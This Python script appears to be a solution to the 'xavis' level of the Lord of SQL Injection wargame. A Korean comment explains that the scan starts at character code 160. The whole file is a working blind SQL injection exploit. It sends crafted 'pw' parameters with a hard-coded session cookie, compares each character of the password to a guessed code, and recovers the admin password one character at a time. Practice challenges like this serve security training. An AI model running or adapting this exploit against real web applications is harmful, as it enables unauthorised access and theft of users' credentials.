# -*- coding : UTF-8 -*-
# pw의 모든 값의 아스키값이 160이 넘기 때문에 효율성 문제로 160부터 시작했습니다.
import requests

# Set cookies
cookies = dict(PHPSESSID='gsen5qt14q70cvj5doeee5lvp1')

result = ""
hexacode = '0x'
for i in range(1,11):
    print("-" * 25)
    print("[=] Testing %d character" % i)
    print('-' * 25)
    for ascii in range(160, 1000):
        if i == 2 or i == 6:
            ascii += 40
        url = 'http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php'
        url += "?pw=1'||ord(id)=97%26%26ord(mid(pw,{0},1))={1}%23".format(i, ascii)
        #print "[=] Testing url : " + url

        r = requests.get(url, cookies=cookies)

        if r.text.find("Hello admin") > -1:
            char = chr(ascii)
            hexacode += str(hex(ascii)).replace('0x', '')
            print("\n[*] %d character is %s (ascii code : %d)\n\n" % (i, char, ascii))
            result += char
            break

print("\n\n\n[*] admin's password : %s(hexacode : %s)" % (result, hexacode))


